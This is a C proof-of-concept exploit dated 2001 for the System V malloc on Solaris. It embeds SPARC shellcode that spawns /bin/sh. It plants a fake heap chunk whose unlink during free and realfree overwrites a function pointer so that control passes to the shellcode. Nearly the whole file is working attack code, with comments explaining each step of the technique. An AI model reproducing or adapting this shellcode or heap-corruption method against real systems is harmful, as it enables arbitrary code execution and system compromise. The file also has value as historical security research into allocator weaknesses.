/* System V malloc implementation exploitation in buffer overflows
 *
 * 2001/05/06
 * -sc/teso
 *
 * tested on sol 2.7/2.8
 * shellcode seems to segfault sometime, but anyway, the malloc overwrite
 * works yay!
 */

#include <stdio.h>
#include <stdlib.h>
#include "mallint.h"


typedef void (* func_ptr)(void);

void
hexdump (unsigned char *data, unsigned int amount);


int
main (int argc, char *argv[])
{
	TREE *		fake;
	TREE *		memchunk;
	unsigned char *	mem;
	func_ptr	func_hook = NULL;

	void *		retloc;
	void *		retaddr;
	unsigned char	shellcode[] =	/* dopesquad.net shellcode + 8 nop bytes */
		"\x10\x80\x00\x03"	/* b		foolabel */
		"\x90\x1b\x80\x0e"	/* xor    	%sp, %sp, %o0 */
/* OVERWRITE */	"\x82\x10\x20\x17"	/* mov    	23, %g1 */

/* foolabel: */	"\x82\x10\x20\x17"	/* mov    	23, %g1 */
		"\x91\xd0\x20\x08"	/* ta     	0x8 */
		"\x21\x0b\xd8\x9a"	/* sethi  	%hi(0x2f626800), %l0 */
		"\xa0\x14\x21\x6e"	/* or     	%l0, 0x16e, %l0	! 0x2f62696e */
		"\x23\x0b\xdc\xda"	/* sethi  	%hi(0x2f736800), %l1 */
		"\x90\x23\xa0\x10"	/* sub    	%sp, 16, %o0 */
		"\x92\x23\xa0\x08"	/* sub    	%sp, 8, %o1 */
		"\x94\x1b\x80\x0e"	/* xor    	%sp, %sp, %o2 */
		"\xe0\x3b\xbf\xf0"	/* std    	%l0, [%sp - 16] */
		"\xd0\x23\xbf\xf8"	/* st     	%o0, [%sp - 8] */
		"\xc0\x23\xbf\xfc"	/* st     	%g0, [%sp - 4] */
		"\x82\x10\x20\x3b"	/* mov    	59, %g1 */
		"\x91\xd0\x20\x08"	/* ta     	0x8 */
		"\x90\x1b\x80\x0e"	/* xor    	%sp, %sp, %o0 */
		"\x82\x10\x20\x01"	/* mov    	1, %g1 */
		"\x91\xd0\x20\x08";	/* ta     	0x8 */


	printf ("shellcode: %02x %02x %02x %02x %02x %02x %02x %02x\n",
		shellcode[0], shellcode[1], shellcode[2], shellcode[3],
		shellcode[4], shellcode[5], shellcode[6], shellcode[7]);
	printf ("           %02x %02x %02x %02x %02x %02x %02x %02x\n",
		shellcode[8], shellcode[9], shellcode[10], shellcode[11],
		shellcode[12], shellcode[13], shellcode[14], shellcode[15]);

	retloc = &func_hook;
	retaddr = shellcode;


	/* get memory chunk which will be overflowed
	 */
	mem = malloc (64);
	memchunk = BLOCK(mem);
	printf ("     mem = 0x%08lx\n", (unsigned long int) mem);
	printf ("memchunk = 0x%08lx\n", (unsigned long int) memchunk);

	/* the overflowed chunk must not be the last, the special 'Bottom'
         * chunk. in that case it would not be merged with the fake chunk
         * behind, because realfree would think it is the last chunk anyway.
         * so we ensure there is a malloc chunk behind the overflowed one
         */
	(void) malloc(2903);

	/* our basic idea is to create a fake non-tree node after the real
	 * chunk, which will later be coalescated with the real chunk. while
	 * this is done, the fake chunk is removed from a chained tree, which
	 * we set up to overwrite arbitrary addresses
	 *
	 * take care of NUL'ing out the lower two bits if using the macros
	 */

#define	RNEXT(b)	((TREE *)(((char *)(b)) + (SIZE(b) & ~BITS01) + WORDSIZE))
	fake = RNEXT(BLOCK(mem));
	printf ("    fake = 0x%08lx\n", (unsigned long int) fake);

	/* conditions to be met:
	 * 1. BIT0(fake) = 0 (it is unused)
	 * 2. ->t_l == -1 (NOTREE)
	 */
	memset (fake, 'A', sizeof (TREE));
	SIZE(fake) = 0xfffffff0;
	CLRBIT0(SIZE(fake));
	SETNOTREE(fake);

	/* t1 = fake->t_p
	 * t2 = fake->t_n
	 * t2->t_p = t1
	 * t1->t_n = t2
	 * (in t_delete)
	 *
	 * effectivly:
	 *    fake->t_n->t_p = fake->t_p
	 *    fake->t_p->t_n = fake->t_n
	 * raw:
	 *    [t_n + (1 * sizeof (WORD))] = t_p
	 *    [t_p + (4 * sizeof (WORD))] = t_n
	 *
	 * so: t_p = retloc - 4 * sizeof (WORD)
	 *     t_n = retaddr
	 *
	 * and retaddr[8-11] will be overwritten with t_p
	 */
	PARENT(fake) = retloc - 4 * sizeof (WORD);
	LINKFOR(fake) = retaddr;

	/* we call free, but our chunk is just added to a "to-be-freed"
	 * list. the real free process is done by the realfree function,
	 * which is called on two conditions:
	 *    1. a malloc() is called
	 *    2. more than FREESIZE free() calls (the list would overflow)
	 */
	printf ("overflowed with:\n");
	hexdump ((unsigned char *) fake, sizeof (TREE));

	printf ("freeing chunk1 (mem) = 0x%08lx\n",
		(unsigned long int) mem);
	free (mem);

	printf ("reallocating a larger chunk (causes realfree)\n");
	mem = malloc (256);

	printf ("survived, hopefully succeeded\n");

	printf ("shellcode: %02x %02x %02x %02x %02x %02x %02x %02x\n",
		shellcode[0], shellcode[1], shellcode[2], shellcode[3],
		shellcode[4], shellcode[5], shellcode[6], shellcode[7]);
	printf ("           %02x %02x %02x %02x %02x %02x %02x %02x\n",
		shellcode[8], shellcode[9], shellcode[10], shellcode[11],
		shellcode[12], shellcode[13], shellcode[14], shellcode[15]);

	printf ("func_hook = 0x%08lx\n", (unsigned long int) func_hook);
	if (func_hook != NULL)
		func_hook ();

	return (0);
}


void
hexdump (unsigned char *data, unsigned int amount)
{
	unsigned int	dp, p;	/* data pointer */
	const char	trans[] =
		"................................ !\"#$%&'()*+,-./0123456789"
		":;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklm"
		"nopqrstuvwxyz{|}~...................................."
		"....................................................."
		"........................................";

	for (dp = 1; dp <= amount; dp++) {
		fprintf (stdout, "%02x ", data[dp-1]);
		if ((dp % 8) == 0)
			fprintf (stdout, " ");
		if ((dp % 16) == 0) {
			fprintf (stdout, "| ");
			p = dp;
			for (dp -= 16; dp < p; dp++)
				fprintf (stdout, "%c", trans[data[dp]]);
			fflush (stdout);
			fprintf (stdout, "\n");
		}
		fflush (stdout);
	}
	if ((amount % 16) != 0) {
		p = dp = 16 - (amount % 16);
		for (dp = p; dp > 0; dp--) {
			fprintf (stdout, "   ");
			if (((dp % 8) == 0) && (p != 8))
				fprintf (stdout, " ");
			fflush (stdout);
		}
		fprintf (stdout, " | ");
		for (dp = (amount - (16 - p)); dp < amount; dp++)
			fprintf (stdout, "%c", trans[data[dp]]);
		fflush (stdout);
	}
	fprintf (stdout, "\n");
}

